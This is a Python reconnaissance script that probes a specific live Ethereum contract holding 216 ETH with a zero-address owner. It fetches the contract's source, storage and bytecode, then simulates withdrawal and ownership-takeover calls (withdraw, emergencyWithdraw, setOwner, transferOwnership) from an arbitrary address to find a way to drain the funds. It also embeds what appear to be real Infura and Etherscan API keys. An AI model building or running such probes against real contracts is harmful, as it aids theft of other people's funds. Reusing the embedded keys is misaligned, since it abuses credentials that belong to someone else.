#!/usr/bin/env python3
"""
Deep analysis of ArbitrageETHStaking contract
- Has 216 ETH
- owner() returns zero address
- Real contract code (not Parity wallet)
- Reverts with "should be more the 0" - suggests withdrawal requires amount > 0
"""
import json
import subprocess
import re

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, from_addr="0x0000000000000000000000000000000000000001", value="0x0"):
    result = rpc_call("eth_call", [{"to": to, "data": data, "from": from_addr, "value": value}, "latest"])
    return result

def estimate_gas(to, data, from_addr="0x0000000000000000000000000000000000000001", value="0x0"):
    result = rpc_call("eth_estimateGas", [{"to": to, "data": data, "from": from_addr, "value": value}])
    return result

def get_balance(addr):
    result = rpc_call("eth_getBalance", [addr, "latest"])
    if result and 'result' in result:
        return int(result['result'], 16) / 1e18
    return 0

def get_storage(addr, slot):
    result = rpc_call("eth_getStorageAt", [addr, slot, "latest"])
    if result and 'result' in result:
        return result['result']
    return None

def get_code(addr):
    result = rpc_call("eth_getCode", [addr, "latest"])
    if result and 'result' in result:
        return result['result']
    return "0x"

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
    except:
        pass
    return None

print("=" * 80)
print("ARBITRAGE ETH STAKING DEEP ANALYSIS")
print("=" * 80)

TARGET = "0x5eee354e36ac51e9d3f7283005cab0c55f423b23"

print(f"\n[CONTRACT] {TARGET}")
print(f"[BALANCE] {get_balance(TARGET):.4f} ETH")

# Get source code
source_data = get_source(TARGET)
if source_data:
    src = source_data.get("SourceCode", "")
    contract_name = source_data.get("ContractName", "Unknown")
    abi = source_data.get("ABI", "")
    print(f"[CONTRACT NAME] {contract_name}")

    if src.startswith("{{"):
        try:
            src_json = json.loads(src[1:-1])
            sources = src_json.get("sources", {})
            src = "\n".join([v.get("content", "") for v in sources.values()])
        except:
            pass
    elif src.startswith("{"):
        try:
            src_json = json.loads(src)
            sources = src_json.get("sources", {})
            src = "\n".join([v.get("content", "") for v in sources.values()])
        except:
            pass

    print(f"[SOURCE LENGTH] {len(src)} chars")
    lines = src.split('\n')

    # Print ENTIRE source since it's small
    print("\n" + "=" * 60)
    print("[FULL SOURCE CODE]")
    print("=" * 60)
    for i, line in enumerate(lines):
        print(f"  {i+1:3}: {line}")

    # Parse ABI for function signatures
    print("\n" + "=" * 60)
    print("[ABI ANALYSIS]")
    print("=" * 60)
    try:
        abi_json = json.loads(abi)
        for item in abi_json:
            if item.get("type") == "function":
                name = item.get("name", "")
                inputs = item.get("inputs", [])
                stateMutability = item.get("stateMutability", "")
                input_types = ",".join([i.get("type", "") for i in inputs])
                print(f"  {name}({input_types}) - {stateMutability}")
    except:
        print("  Could not parse ABI")

# Storage analysis
print("\n" + "=" * 60)
print("[STORAGE ANALYSIS]")
print("=" * 60)

for i in range(20):
    val = get_storage(TARGET, hex(i))
    if val and val != "0x" + "0"*64:
        print(f"  Slot {i}: {val}")

# Test various function calls
print("\n" + "=" * 60)
print("[FUNCTION TESTS]")
print("=" * 60)

# Common function selectors
test_cases = [
    ("0x8da5cb5b", "owner()", ""),  # owner
    ("0x3ccfd60b", "withdraw()", ""),  # withdraw
    ("0xd0e30db0", "deposit()", "de0b6b3a7640000"),  # deposit with 1 ETH
    ("0x2e1a7d4d", "withdraw(uint256)", "0000000000000000000000000000000000000000000000000de0b6b3a7640000"),  # withdraw 1 ETH
    ("0xf714ce58", "withdraw(uint256,address)", "0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000000000000000000000001"),
    ("0x853828b6", "withdrawAll()", ""),
    ("0xc2a672e0", "withdrawTokens(address,address)", "000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee0000000000000000000000000000000000000000000000000000000000000001"),
    ("0xb60d4288", "fund()", "de0b6b3a7640000"),
    ("0x5312ea8e", "emergencyWithdraw(uint256)", "0000000000000000000000000000000000000000000000000000000000000000"),
    ("0xa9059cbb", "transfer(address,uint256)", "00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000de0b6b3a7640000"),
    ("0x13af4035", "setOwner(address)", "0000000000000000000000000000000000000000000000000000000000000001"),  # setOwner
    ("0xf2fde38b", "transferOwnership(address)", "0000000000000000000000000000000000000000000000000000000000000001"),  # transferOwnership
]

for selector, name, params in test_cases:
    data = selector + params
    value = "0x0"
    if "deposit" in name or "fund" in name:
        value = "0xde0b6b3a7640000"  # 1 ETH

    result = estimate_gas(TARGET, data, value=value)
    if result:
        if 'result' in result:
            gas = int(result['result'], 16)
            print(f"  [+] {name} - CALLABLE with gas: {gas}")

            # Also get return value for view functions
            if "view" in name or name in ["owner()"]:
                call_result = eth_call(TARGET, data)
                if call_result and call_result.get('result'):
                    print(f"      Return: {call_result['result']}")
        elif 'error' in result:
            err = result['error'].get('message', '')[:70]
            print(f"  [-] {name}: {err}")

# Check if owner can be taken over
print("\n" + "=" * 60)
print("[OWNERSHIP ANALYSIS]")
print("=" * 60)

owner_result = eth_call(TARGET, "0x8da5cb5b")  # owner()
if owner_result and owner_result.get('result'):
    owner = "0x" + owner_result['result'][26:]
    print(f"  Current owner: {owner}")

    if owner == "0x0000000000000000000000000000000000000000":
        print("  [!] OWNER IS ZERO ADDRESS!")

        # Try to see if we can call owner-only functions
        print("\n  Testing owner-only functions from random address...")

        # Try to call withdraw with a specific amount
        withdraw_data = "0x2e1a7d4d" + "0000000000000000000000000000000000000000000000000de0b6b3a7640000"  # 1 ETH
        result = estimate_gas(TARGET, withdraw_data, from_addr="0x0000000000000000000000000000000000000001")
        if result:
            if 'result' in result:
                print(f"    [+] withdraw(1 ETH) CALLABLE! Gas: {int(result['result'], 16)}")
            elif 'error' in result:
                err = result['error'].get('message', '')
                print(f"    [-] withdraw(1 ETH): {err}")

# Look at the bytecode for patterns
print("\n" + "=" * 60)
print("[BYTECODE ANALYSIS]")
print("=" * 60)

code = get_code(TARGET)
print(f"  Code length: {len(code)} chars")

# Check for common patterns
patterns = [
    ("SELFDESTRUCT", "ff"),
    ("DELEGATECALL", "f4"),
    ("CREATE2", "f5"),
    ("CALLCODE", "f2"),
]

for name, opcode in patterns:
    if opcode in code[2:].lower():
        print(f"  [!] Contains {name} opcode")

# Find function selectors in bytecode
print("\n  Function selectors in bytecode:")
# Look for PUSH4 patterns (63 XX XX XX XX)
import re
selectors = re.findall(r'63([0-9a-f]{8})', code[2:].lower())
for sel in set(selectors):
    print(f"    0x{sel}")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
